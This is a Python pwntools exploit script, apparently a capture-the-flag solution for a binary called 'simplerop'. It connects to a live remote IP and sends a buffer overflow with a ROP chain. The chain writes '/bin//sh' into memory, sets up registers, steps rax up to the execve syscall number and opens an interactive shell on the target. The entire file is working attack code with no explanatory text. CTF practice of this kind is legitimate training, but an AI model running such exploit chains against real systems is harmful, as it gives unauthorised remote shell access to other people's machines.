import time
from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node5.anna.nssctf.cn", 28604)
io = remote("112.6.51.212", 31032)
# io = process('./alloc')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('simplerop')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    return io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

p = b'a' * 0x28

p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
p += pack('<Q', 0x000000000049d0c0) # @ .data
p += pack('<Q', 0x0000000000419a1c) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000041ac41) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
p += pack('<Q', 0x000000000049d0c8) # @ .data + 8
p += pack('<Q', 0x0000000000417e25) # xor rax, rax ; ret
p += pack('<Q', 0x000000000041ac41) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401d1d) # pop rdi ; ret
p += pack('<Q', 0x000000000049d0c0) # @ .data
p += pack('<Q', 0x000000000040a30d) # pop rsi ; ret
p += pack('<Q', 0x000000000049d0c8) # @ .data + 8
p += pack('<Q', 0x0000000000401858) # pop rdx ; ret
p += pack('<Q', 0x000000000049d0c8) # @ .data + 8
p += pack('<Q', 0x0000000000417e25) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000450860) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401243) # syscall

sl(p)

inter()
